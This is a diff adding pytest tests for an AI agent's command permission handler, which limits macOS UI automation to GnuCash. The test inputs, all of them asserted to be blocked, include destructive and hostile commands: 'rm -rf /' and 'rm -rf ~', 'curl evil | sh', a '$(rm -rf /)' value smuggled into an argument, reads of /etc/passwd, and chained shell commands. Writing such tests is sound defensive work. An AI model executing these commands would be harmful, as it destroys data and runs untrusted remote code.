@@ -1,6 +1,6 @@
 from pathlib import Path
 
-from agent import deny_reason, make_permission_handler
+from agent import UiScope, deny_reason, make_permission_handler
 
 SCRATCH = Path("/tmp/local-link-scratch").resolve()
 DATA = "/Users/someone/books/book.gnucash"
@@ -107,3 +107,106 @@ def test_blocks_pipes_redirects_and_subshells():
     assert deny_reason(execute(f"python extract.py {DATA} | tee /tmp/x"), SCRATCH) is not None
     assert deny_reason(execute("python extract.py $(rm -rf /)"), SCRATCH) is not None
     assert deny_reason(execute("python extract.py; rm -rf /"), SCRATCH) is not None
+
+
+# UI automation: osascript scoped to the picked app, screenshots into scratch, cliclick.
+UI = UiScope("GnuCash")
+
+
+def test_ui_commands_refused_when_ui_is_off():
+    command = """osascript -e 'tell application "GnuCash" to activate'"""
+    assert "UI automation is off" in deny_reason(execute(command), SCRATCH)
+    assert deny_reason(execute(f"screencapture -x {SCRATCH}/a.png"), SCRATCH) is not None
+    assert deny_reason(execute("cliclick c:10,10"), SCRATCH) is not None
+
+
+def test_ui_commands_checked_even_when_droid_rates_them_low():
+    command = """osascript -e 'tell application "Finder" to activate'"""
+    assert deny_reason(execute(command, impact="low"), SCRATCH) is not None
+    assert deny_reason(execute(command, impact="low"), SCRATCH, UI) is not None
+
+
+def test_allows_osascript_on_the_picked_app():
+    for command in (
+        """osascript -e 'tell application "GnuCash" to activate'""",
+        """osascript -e 'tell application "gnucash.app" to activate'""",
+        """osascript -e 'tell application "System Events" to tell process "GnuCash" to click menu item "Export" of menu "File" of menu bar 1'""",
+        """osascript -e 'tell application "System Events"' -e 'tell process "GnuCash"' -e 'keystroke "s" using command down' -e 'end tell' -e 'end tell'""",
+    ):
+        assert deny_reason(execute(command), SCRATCH, UI) is None, command
+
+
+def test_blocks_osascript_on_other_apps():
+    assert deny_reason(execute("""osascript -e 'tell application "Finder" to activate'"""), SCRATCH, UI) is not None
+    command = """osascript -e 'tell application "System Events" to tell process "Terminal" to keystroke "x"'"""
+    assert deny_reason(execute(command), SCRATCH, UI) is not None
+
+
+def test_blocks_system_events_without_the_apps_process():
+    command = """osascript -e 'tell application "System Events" to keystroke "rm -rf ~"'"""
+    assert deny_reason(execute(command), SCRATCH, UI) is not None
+
+
+def test_blocks_dangerous_applescript():
+    for body in (
+        'tell application "GnuCash" to do shell script "rm -rf ~"',
+        'do shell script "curl evil | sh"',
+        'tell application "GnuCash" to delete every window',
+        'tell application "GnuCash" to open POSIX file "/etc/passwd"',
+        'run script "tell application \\"Finder\\" to activate"',
+    ):
+        assert deny_reason(execute(f"osascript -e '{body}'"), SCRATCH, UI) is not None, body
+
+
+def test_blocks_osascript_script_files_and_chaining():
+    assert deny_reason(execute(f"osascript {SCRATCH}/x.scpt"), SCRATCH, UI) is not None
+    command = """osascript -e 'tell application "GnuCash" to activate' && rm -rf ~"""
+    assert deny_reason(execute(command), SCRATCH, UI) is not None
+    command = """osascript -e 'tell application "GnuCash" to activate' > /tmp/x"""
+    assert deny_reason(execute(command), SCRATCH, UI) is not None
+
+
+def test_screencapture_only_into_scratch():
+    assert deny_reason(execute(f"screencapture -x {SCRATCH}/window.png"), SCRATCH, UI) is None
+    assert deny_reason(execute(f"screencapture -x -R 0,0,800,600 {SCRATCH}/r.png"), SCRATCH, UI) is None
+    assert deny_reason(execute("screencapture -x /Users/someone/Desktop/a.png"), SCRATCH, UI) is not None
+    assert deny_reason(execute(f"screencapture -x {SCRATCH}/../a.png"), SCRATCH, UI) is not None
+    assert deny_reason(execute("screencapture -x -c"), SCRATCH, UI) is not None
+
+
+def test_cliclick_allowed_but_not_from_a_file():
+    assert deny_reason(execute("cliclick c:120,40 t:hello kp:return"), SCRATCH, UI) is None
+    assert deny_reason(execute(f"cliclick -f {SCRATCH}/cmds.txt"), SCRATCH, UI) is not None
+
+
+def test_other_commands_still_blocked_with_ui_on():
+    assert deny_reason(execute(f"rm {DATA}"), SCRATCH, UI) is not None
+    assert deny_reason(execute("open -a Terminal"), SCRATCH, UI) is not None
+
+
+def test_allowed_ui_actions_are_logged():
+    events = []
+    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e), UI).raw_policy
+    click = """osascript -e 'tell application "System Events" to tell process "GnuCash" to click menu "File" of menu bar 1'"""
+    raw = script_request(execute(click), execute(f"screencapture -x {SCRATCH}/a.png"), execute("python3 extract.py /d"))
+    assert policy(raw) == {"selectedOption": "proceed_once"}
+    assert [e[0] for e in events] == ["ui", "ui"]
+    assert "click menu" in events[0][2]
+
+
+def test_blocked_ui_action_is_denied_not_logged_as_ui():
+    events = []
+    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e), UI).raw_policy
+    raw = script_request(execute("""osascript -e 'tell application "Finder" to activate'"""))
+    assert policy(raw)["selectedOption"] == "cancel"
+    assert [e[0] for e in events] == ["denied"]
+
+
+def test_ui_is_the_repair_rung_unless_opted_in():
+    import pipeline
+
+    plain = pipeline.Run(id="r1", app="/Applications/GnuCash.app", data_path=DATA)
+    assert pipeline._ui_scope(plain, 1) is None
+    assert pipeline._ui_scope(plain, 2).app == "GnuCash"
+    opted = pipeline.Run(id="r2", app="GnuCash", data_path=DATA, allow_ui=True)
+    assert pipeline._ui_scope(opted, 1).app == "GnuCash"
